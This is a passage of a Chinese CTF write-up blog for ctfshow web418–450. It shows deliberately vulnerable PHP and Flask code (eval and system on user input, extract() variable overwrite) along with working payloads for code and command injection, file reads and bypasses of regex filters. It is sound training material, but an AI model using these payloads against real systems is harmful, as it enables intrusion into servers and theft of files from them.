class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p><p>这里有点误导让你，去写后门，但是$key===0x36d这个是强等于,0x36d 这个是integer整形，但是传的字符串却是字符型，绕不过去，所以这题用变量覆盖修改$clear就可以了，</p><p><strong>extract</strong>   ——-&gt;   变量覆盖</p><p><img src="../images/image-20230401161846730.png" alt="image-20230401161846730"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure><p>payload的意思是，因为if那绕不过去了，所以会执行下面的语句，然后为了能执行clear($clear),所以就让$die为0，然后就可以执行到clear了</p><p><strong>这里加的分号是为了不让rm -rf删掉文件</strong></p><p>然后就会执行clear(rm -rf;cp flag.php flag.txt)</p><h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat f*`;</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话是先用    ls 查找flag位置，然后用<code>ls ../</code>找到了flag位置，然后直接读取</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ../*</span><br></pre></td></tr></table></figure><h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>题目</p><h2 id="web424-ssti"><a href="#web424-ssti" class="headerlink" title="web424(ssti)"></a>web424(ssti)</h2><p>题目</p><p><img src="../images/image-20230405212426830.png" alt="image-20230405212426830"></p><p>查看注释发现给了一个参数可以进行传值</p><p><img src="../images/image-20230405212500712.png" alt="image-20230405212500712"></p><p><strong>源码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里因为没有os模块了，那么直接就用open来拿到flag</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag).read()</span></span><br></pre></td></tr></table></figure><p>自己导入有个os模块也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat app.py&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web425-过滤了os"><a href="#web425-过滤了os" class="headerlink" title="web425(过滤了os)"></a>web425(过滤了os)</h2><p>题目</p><p><img src="../images/image-20230405213333700.png" alt="image-20230405213333700"></p><p>还是一样</p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230405213451936.png" alt="image-20230405213451936"></p><p>使用这个<strong>open</strong>的前提是得知道文件名     <strong>这个不能使用通配符</strong></p><h2 id="web426-过滤了os-popen"><a href="#web426-过滤了os-popen" class="headerlink" title="web426(过滤了os|popen)"></a>web426(过滤了os|popen)</h2><p>题目</p><p><img src="../images/image-20230405213734721.png" alt="image-20230405213734721"></p><p>还是不影响</p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web427-过滤了os-popen-system"><a href="#web427-过滤了os-popen-system" class="headerlink" title="web427(过滤了os|popen|system)"></a>web427(过滤了os|popen|system)</h2><p>题目</p><p><img src="../images/image-20230405213949469.png" alt="image-20230405213949469"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web428-过滤os-popen-system-read"><a href="#web428-过滤os-popen-system-read" class="headerlink" title="web428(过滤os|popen|system|read)"></a>web428(过滤os|popen|system|read)</h2><p>题目</p><p><img src="../images/image-20230405214151770.png" alt="image-20230405214151770"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>因为这里是只匹配开头</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="web429-ssti-过滤了os-open-system-read"><a href="#web429-ssti-过滤了os-open-system-read" class="headerlink" title="web429(ssti 过滤了os|open|system|read)"></a>web429(ssti 过滤了os|open|system|read)</h2><p>题目<img src="../images/image-20230405214409832.png" alt="image-20230405214409832"></p><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里匹配是只匹配了开头，<strong>所以只需要在payload前面加个空格就好了</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web430-ssti-过滤了os-open-system-read-eval"><a href="#web430-ssti-过滤了os-open-system-read-eval" class="headerlink" title="web430(ssti 过滤了os|open|system|read|eval)"></a>web430(ssti 过滤了os|open|system|read|eval)</h2><p><strong>同 web429的做法</strong></p><p>也是只匹配开头</p><h2 id="web-431-ssti-过滤了过滤了os-open-system-read-eval-str"><a href="#web-431-ssti-过滤了过滤了os-open-system-read-eval-str" class="headerlink" title="web 431 ssti 过滤了过滤了os|open|system|read|eval|str"></a>web 431 ssti 过滤了过滤了os|open|system|read|eval|str</h2><p><strong>同web430</strong></p><p><strong>后面就是正常的过滤了，因为过滤了eval所以我们只能用exec来执行了.但是exec的返回值永远是none，所以只能用一些盲打的方法了。</strong></p><h2 id="web432-过滤os-open-system-read-eval-web449都是ssti的题目"><a href="#web432-过滤os-open-system-read-eval-web449都是ssti的题目" class="headerlink" title="web432(过滤os|open|system|read|eval)-web449都是ssti的题目"></a>web432(过滤os|open|system|read|eval)-web449都是ssti的题目</h2><p>这里就不做了</p><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 